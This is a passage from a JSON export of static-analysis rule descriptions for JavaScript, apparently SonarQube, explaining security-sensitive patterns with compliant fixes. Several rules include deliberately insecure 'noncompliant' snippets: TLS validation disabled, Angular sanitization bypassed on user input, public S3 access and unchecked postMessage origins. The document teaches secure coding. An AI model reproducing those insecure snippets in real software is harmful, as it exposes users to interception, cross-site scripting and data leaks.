<code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID). </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n  <li> Addresses in the 2001:db8::/32 range, reserved for documentation purposes by <a href=\"https://datatracker.ietf.org/doc/html/rfc3849\">RFC\n  3849</a> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S4823": {
        "name": "Using command line arguments is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281\">CVE-2018-7281</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326\">CVE-2018-12326</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198\">CVE-2011-3198</a> </li>\n</ul>\n<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>\n<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus\npassing sensitive information via command line arguments should be considered as insecure.</p>\n<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide\nsecurity code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> any of the command line arguments are used without being sanitized first. </li>\n  <li> your application accepts sensitive information via command line arguments. </li>\n</ul>\n<p>If you answered yes to any of these questions you are at risk.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p><a href=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitize</a> all command line arguments before using them.</p>\n<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing\nsensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the\npath to a file containing the information.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n// The process object is a global that provides information about, and control over, the current Node.js process\nvar param = process.argv[2]; // Sensitive: check how the argument is used\nconsole.log('Param: ' + param);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/88\">CWE-88 - Argument Injection or Modification</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/214\">CWE-214 - Information Exposure Through Process Environment</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S4829": {
        "name": "Reading the Standard Input is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337\">CVE-2005-2337</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449\">CVE-2017-11449</a> </li>\n</ul>\n<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)\ncan be dangerous and should be validated.</p>\n<p>This rule flags code that reads from the standard input.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> data read from the standard input is not sanitized before being used. </li>\n</ul>\n<p>You are at risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p><a href=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitize</a> all data read from the standard input before using it.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n// The process object is a global that provides information about, and control over, the current Node.js process\n// All uses of process.stdin are security-sensitive and should be reviewed\n\nprocess.stdin.on('readable', () =&gt; {\n\tconst chunk = process.stdin.read(); // Sensitive\n\tif (chunk !== null) {\n\t\tdosomething(chunk);\n\t}\n});\n\nconst readline = require('readline');\nreadline.createInterface({\n\tinput: process.stdin // Sensitive\n}).on('line', (input) =&gt; {\n\tdosomething(input);\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S4830": {
        "name": "Server certificates should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.\nCertificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>\n<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted\nentity and intercept, manipulate, or steal the data being transmitted.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to\nbuild this trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can\nexploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s\nserver, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect\nany data your system sends to them, potentially leading to significant data breaches.</p>\n<h4>Loss of data integrity</h4>\n<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data\nin transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious\ncode or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the\nsystem.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled certificate validation.</p>\n<p>The certificate validation gets disabled by setting <code>rejectUnauthorized</code> to <code>false</code>. To enable validation set the value to\n<code>true</code> or do not set <code>rejectUnauthorized</code> at all to use the secure default value.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst https = require('node:https');\n\nlet options = {\n  hostname: 'www.example.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  rejectUnauthorized: false,\n  secureProtocol: 'TLSv1_2_method'\n};\n\nlet req = https.request(options, (res) =&gt; {\n  res.on('data', (d) =&gt; {\n    process.stdout.write(d);\n  });\n}); // Noncompliant\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nconst tls = require('node:tls');\n\nlet options = {\n    rejectUnauthorized: false,\n    secureProtocol: 'TLSv1_2_method'\n};\n\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; {\n  process.stdin.pipe(socket);\n  process.stdin.resume();\n}); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst https = require('node:https');\n\nlet options = {\n  hostname: 'www.example.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  secureProtocol: 'TLSv1_2_method'\n};\n\nlet req = https.request(options, (res) =&gt; {\n  res.on('data', (d) =&gt; {\n    process.stdout.write(d);\n  });\n});\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nconst tls = require('node:tls');\n\nlet options = {\n    secureProtocol: 'TLSv1_2_method'\n};\n\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; {\n  process.stdin.pipe(socket);\n  process.stdin.resume();\n});\n</pre>\n<h3>How does this work?</h3>\n<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>\n<p>To avoid running into problems with invalid certificates, consider the following sections.</p>\n<h4>Using trusted certificates</h4>\n<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list\nof trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no\nadditional code or configuration.</p>\n<h4>Working with self-signed certificates or non-standard CAs</h4>\n<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted\nroots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/295\">CWE-295 - Improper Certificate Validation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S1442": {
        "name": "\"alert(...)\" should not be used",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=javascript%3AS4507'>S4507</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p><code>alert(...)</code> as well as <code>confirm(...)</code> and <code>prompt(...)</code> can be useful for debugging during development, but in\nproduction mode this kind of pop-up could expose sensitive information to attackers, and should never be displayed.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nif(unexpectedCondition) {\n  alert(\"Unexpected Condition\");\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/489\">CWE-489 - Active Debug Code</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S6268": {
        "name": "Disabling Angular built-in sanitization is security-sensitive",
        "htmlDesc": "<p>Angular prevents XSS vulnerabilities by treating all values as untrusted by default. Untrusted values are systematically sanitized by the framework\nbefore they are inserted into the DOM.</p>\n<p>Still, developers have the ability to manually mark a value as trusted if they are sure that the value is already sanitized. Accidentally trusting\nmalicious data will introduce an XSS vulnerability in the application and enable a wide range of serious attacks like accessing/modifying sensitive\ninformation or impersonating other users.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The value for which sanitization has been disabled is user-controlled. </li>\n  <li> It’s difficult to understand how this value is constructed. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Avoid including dynamic executable code and thus disabling Angular’s built-in sanitization unless it’s absolutely necessary. Try instead to\n  rely as much as possible on static templates and Angular built-in sanitization to define web page content. </li>\n  <li> Make sure to understand how the value to consider as trusted is constructed and never concatenate it with user-controlled data. </li>\n  <li> Make sure to choose the correct <a href=\"https://angular.io/api/platform-browser/DomSanitizer\">DomSanitizer</a> \"bypass\" method based on the\n  context. For instance, only use <code>bypassSecurityTrustUrl</code> to trust urls in an <code>href</code> attribute context. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport { Component, OnInit } from '@angular/core';\nimport { DomSanitizer, SafeHtml } from \"@angular/platform-browser\";\nimport { ActivatedRoute } from '@angular/router';\n\n@Component({\n  template: '&lt;div id=\"hello\" [innerHTML]=\"hello\"&gt;&lt;/div&gt;'\n})\nexport class HelloComponent implements OnInit {\n  hello: SafeHtml;\n\n  constructor(private sanitizer: DomSanitizer, private route: ActivatedRoute) { }\n\n  ngOnInit(): void {\n    let name = this.route.snapshot.queryParams.name;\n    let html = \"&lt;h1&gt;Hello \" + name + \"&lt;/h1&gt;\";\n    this.hello = this.sanitizer.bypassSecurityTrustHtml(html); // Sensitive\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport { Component, OnInit } from '@angular/core';\nimport { DomSanitizer } from \"@angular/platform-browser\";\nimport { ActivatedRoute } from '@angular/router';\n\n@Component({\n  template: '&lt;div id=\"hello\"&gt;&lt;h1&gt;Hello {{name}}&lt;/h1&gt;&lt;/div&gt;',\n})\nexport class HelloComponent implements OnInit {\n  name: string;\n\n  constructor(private sanitizer: DomSanitizer, private route: ActivatedRoute) { }\n\n  ngOnInit(): void {\n    this.name = this.route.snapshot.queryParams.name;\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n  <li> <a href=\"https://angular.io/guide/security\">Angular - Best Practices - Security</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javascript:S6245": {
        "name": "Disabling server-side encryption of S3 buckets is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Server-side encryption (SSE) encrypts an object (not the metadata) as it is written to disk (where the S3 bucket resides) and decrypts it as it is\nread from disk. This doesn’t change the way the objects are accessed, as long as the user has the necessary permissions, objects are retrieved as if\nthey were unencrypted. Thus, SSE only helps in the event of disk thefts, improper disposals of disks and other attacks on the AWS infrastructure\nitself.</p>\n<p>There are three SSE options:</p>\n<ul>\n  <li> Server-Side Encryption with Amazon S3-Managed Keys (SSE-S3)\n    <ul>\n      <li> AWS manages encryption keys and the encryption itself (with AES-256) on its own. </li>\n    </ul>  </li>\n  <li> Server-Side Encryption with Customer Master Keys (CMKs) Stored in AWS Key Management Service (SSE-KMS)\n    <ul>\n      <li> AWS manages the encryption (AES-256) of objects and encryption keys provided by the AWS KMS service. </li>\n    </ul>  </li>\n  <li> Server-Side Encryption with Customer-Provided Keys (SSE-C)\n    <ul>\n      <li> AWS manages only the encryption (AES-256) of objects with encryption keys provided by the customer. AWS doesn’t store the customer’s\n      encryption keys. </li>\n    </ul>  </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive information. </li>\n  <li> The infrastructure needs to comply to some regulations, like HIPAA or PCI DSS, and other standards. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to use SSE. Choosing the appropriate option depends on the level of control required for the management of encryption keys.</p>\n<h2>Sensitive Code Example</h2>\n<p>Server-side encryption is not used:</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    bucketName: 'default'\n}); // Sensitive\n</pre>\n<p>Bucket encryption is disabled by default.</p>\n<h2>Compliant Solution</h2>\n<p>Server-side encryption with Amazon S3-Managed Keys is used:</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    encryption: s3.BucketEncryption.KMS_MANAGED\n});\n\n# Alternatively with a KMS key managed by the user.\n\nnew s3.Bucket(this, 'id', {\n    encryption: s3.BucketEncryption.KMS_MANAGED,\n    encryptionKey: access_key\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/serv-side-encryption.html\">AWS documentation</a> - Protecting data using\n  server-side encryption </li>\n  <li> <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.BucketEncryption.html\">AWS CDK version 2</a> - BucketEncryption </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S6249": {
        "name": "Authorizing HTTP communications with S3 buckets is security-sensitive",
        "htmlDesc": "<p>By default, S3 buckets can be accessed through HTTP and HTTPs protocols.</p>\n<p>As HTTP is a clear-text protocol, it lacks the encryption of transported data, as well as the capability to build an authenticated connection. It\nmeans that a malicious actor who is able to intercept traffic from the network can read, modify or corrupt the transported content.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive information. </li>\n  <li> The infrastructure has to comply with AWS Foundational Security Best Practices standard. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to enforce HTTPS only access by setting <code>enforceSSL</code> property to <code>true</code></p>\n<h2>Sensitive Code Example</h2>\n<p>S3 bucket objects access through TLS is not enforced by default:</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nconst bucket = new s3.Bucket(this, 'example'); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nconst bucket = new s3.Bucket(this, 'example', {\n    bucketName: 'example',\n    versioned: true,\n    publicReadAccess: false,\n    enforceSSL: true\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html#transit\">AWS documentation</a> - Enforce encryption\n  of data in transit </li>\n  <li> <a href=\"https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-standards-fsbp-controls.html#fsbp-s3-5\">AWS Foundational Security\n  Best Practices controls</a> - S3 buckets should require requests to use Secure Socket Layer </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html\">AWS CDK version 2</a> - Bucket </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S6265": {
        "name": "Granting access to S3 buckets to all or authenticated users is security-sensitive",
        "htmlDesc": "<p>Predefined permissions, also known as <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl\">canned ACLs</a>,\nare an easy way to grant large privileges to predefined groups or users.</p>\n<p>The following canned ACLs are security-sensitive:</p>\n<ul>\n  <li> <code>PUBLIC_READ</code>, <code>PUBLIC_READ_WRITE</code> grant respectively \"read\" and \"read and write\" privileges to anyone, either\n  authenticated or anonymous (<code>AllUsers</code> group). </li>\n  <li> <code>AUTHENTICATED_READ</code> grants \"read\" privilege to all authenticated users (<code>AuthenticatedUsers</code> group). </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive data. </li>\n  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to implement the least privilege policy, i.e., to only grant users the necessary permissions for their required tasks. In the\ncontext of canned ACL, set it to <code>PRIVATE</code> (the default one), and if needed more granularity then use an appropriate S3 policy.</p>\n<h2>Sensitive Code Example</h2>\n<p>All users, either authenticated or anonymous, have read and write permissions with the <code>PUBLIC_READ_WRITE</code> access control:</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'bucket', {\n    accessControl: s3.BucketAccessControl.PUBLIC_READ_WRITE // Sensitive\n});\n\nnew s3deploy.BucketDeployment(this, 'DeployWebsite', {\n    accessControl: s3.BucketAccessControl.PUBLIC_READ_WRITE // Sensitive\n});\n</pre>\n<h2>Compliant Solution</h2>\n<p>With the <code>PRIVATE</code> access control (default), only the bucket owner has the read/write permissions on the bucket and its ACL.</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'bucket', {\n    accessControl: s3.BucketAccessControl.PRIVATE\n});\n\nnew s3deploy.BucketDeployment(this, 'DeployWebsite', {\n    accessControl: s3.BucketAccessControl.PRIVATE\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl\">AWS Documentation</a> - Access control list (ACL)\n  overview (canned ACLs) </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/walkthrough1.html\">AWS Documentation</a> - Controlling access to a bucket with\n  user policies </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html\">AWS CDK version 2</a> - Class Bucket (construct) </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javascript:S6270": {
        "name": "Policies authorizing public access to resources are security-sensitive",
        "htmlDesc": "<p>Resource-based policies granting access to all users can lead to information leakage.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The AWS resource stores or processes sensitive data. </li>\n  <li> The AWS resource is designed to be private. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to implement the least privilege principle, i.e. to grant necessary permissions only to users for their required tasks. In the\ncontext of resource-based policies, list the principals that need the access and grant to them only the required privileges.</p>\n<h2>Sensitive Code Example</h2>\n<p>This policy allows all users, including anonymous ones, to access an S3 bucket:</p>\n<pre>\nimport { aws_iam as iam } from 'aws-cdk-lib'\nimport { aws_s3 as s3 } from 'aws-cdk-lib'\n\nconst bucket = new s3.Bucket(this, \"ExampleBucket\")\n\nbucket.addToResourcePolicy(new iam.PolicyStatement({\n    effect: iam.Effect.ALLOW,\n    actions: [\"s3:*\"],\n    resources: [bucket.arnForObjects(\"*\")],\n    principals: [new iam.AnyPrincipal()] // Sensitive\n}))\n</pre>\n<h2>Compliant Solution</h2>\n<p>This policy allows only the authorized users:</p>\n<pre>\nimport { aws_iam as iam } from 'aws-cdk-lib'\nimport { aws_s3 as s3 } from 'aws-cdk-lib'\n\nconst bucket = new s3.Bucket(this, \"ExampleBucket\")\n\nbucket.addToResourcePolicy(new iam.PolicyStatement({\n    effect: iam.Effect.ALLOW,\n    actions: [\"s3:*\"],\n    resources: [bucket.arnForObjects(\"*\")],\n    principals: [new iam.AccountRootPrincipal()]\n}))\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege\">AWS Documentation</a> - Grant least\n  privilege </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javascript:S6275": {
        "name": "Using unencrypted EBS volumes is security-sensitive",
        "htmlDesc": "<p>Amazon Elastic Block Store (EBS) is a block-storage service for Amazon Elastic Compute Cloud (EC2). EBS volumes can be encrypted, ensuring the\nsecurity of both data-at-rest and data-in-transit between an instance and its attached EBS storage. In the case that adversaries gain physical access\nto the storage medium they are not able to access the data. Encryption can be enabled for specific volumes or for <a\nhref=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default\">all new volumes and snapshots</a>. Volumes created\nfrom snapshots inherit their encryption configuration. A volume created from an encrypted snapshot will also be encrypted by default.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The disk contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt EBS volumes that contain sensitive information. Encryption and decryption are handled transparently by EC2, so no\nfurther modifications to the application are necessary. Instead of enabling encryption for every volume, it is also possible to enable encryption\nglobally for a specific region. While creating volumes from encrypted snapshots will result in them being encrypted, explicitly enabling this security\nparameter will prevent any future unexpected security downgrade.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html\">aws_cdk.aws_ec2.Volume</a>:</p>\n<pre>\nimport { Size } from 'aws-cdk-lib';\nimport { Volume } from 'aws-cdk-lib/aws-ec2';\n\nnew Volume(this, 'unencrypted-explicit', {\n      availabilityZone: 'us-west-2a',\n      size: Size.gibibytes(1),\n      encrypted: false // Sensitive\n    });\n</pre>\n<pre>\nimport { Size } from 'aws-cdk-lib';\nimport { Volume } from 'aws-cdk-lib/aws-ec2';\n\nnew Volume(this, 'unencrypted-implicit', {\n      availabilityZone: 'eu-west-1a',\n      size: Size.gibibytes(1),\n    }); // Sensitive as encryption is disabled by default\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html\">aws_cdk.aws_ec2.Volume</a>:</p>\n<pre>\nimport { Size } from 'aws-cdk-lib';\nimport { Volume } from 'aws-cdk-lib/aws-ec2';\n\nnew Volume(this, 'encrypted-explicit', {\n      availabilityZone: 'eu-west-1a',\n      size: Size.gibibytes(1),\n      encrypted: true\n    });\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html\">Amazon EBS encryption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javascript:S2819": {
        "name": "Origins should be verified during cross-origin communications",
        "htmlDesc": "<p>Cross-origin communication allows different websites to interact with each other. This interaction is typically achieved through mechanisms like\nAJAX requests, WebSockets, or postMessage API. However, a vulnerability can arise when these communications are not properly secured by verifying\ntheir origins.</p>\n<h2>Why is this an issue?</h2>\n<p>Without origin verification, the target website cannot distinguish between legitimate requests from its own pages and malicious requests from an\nattacker’s site. The attacker can craft a malicious website or script that sends requests to a target website where the user is already\nauthenticated.</p>\n<p>This vulnerability class is not about a single specific user input or action, but rather a series of actions that lead to an insecure cross-origin\ncommunication.</p>\n<h3>What is the potential impact?</h3>\n<p>The absence of origin verification during cross-origin communications can lead to serious security issues.</p>\n<h4>Data Breach</h4>\n<p>If an attacker can successfully exploit this vulnerability, they may gain unauthorized access to sensitive data. For instance, a user’s personal\ninformation, financial details, or other confidential data could be exposed. This not only compromises the user’s privacy but can also lead to\nidentity theft or financial loss.</p>\n<h4>Unauthorized Actions</h4>\n<p>An attacker could manipulate the communication between websites to perform actions on behalf of the user without their knowledge. This could range\nfrom making unauthorized purchases to changing user settings or even deleting accounts.</p>\n<h2>How to fix it</h2>\n<p>When sending a message, avoid using <code>*</code> for the target origin (it means no preference). Instead define it explicitly so the message will\nonly be dispatched to this URI. When receiving the message, verify the orgin to be sure that it is sent by an authorized sender.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>When sending a message:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nvar iframe = document.getElementById(\"testiframe\");\niframe.contentWindow.postMessage(\"hello\", \"*\"); // Noncompliant: * is used\n</pre>\n<p>When receiving a message:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nwindow.addEventListener(\"message\", function(event) { // Noncompliant: no checks are done on the origin property.\n  console.log(event.data);\n });\n</pre>\n<h4>Compliant solution</h4>\n<p>When sending a message:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nvar iframe = document.getElementById(\"testiframe\");\niframe.contentWindow.postMessage(\"hello\", \"https://secure.example.com\");\n</pre>\n<p>When receiving a message:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nwindow.addEventListener(\"message\", function(event) {\n  if (event.origin !== \"http://example.org\")\n    return;\n\n  console.log(event.data)\n});\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> MDN web docs - <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage\">postMessage API</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a 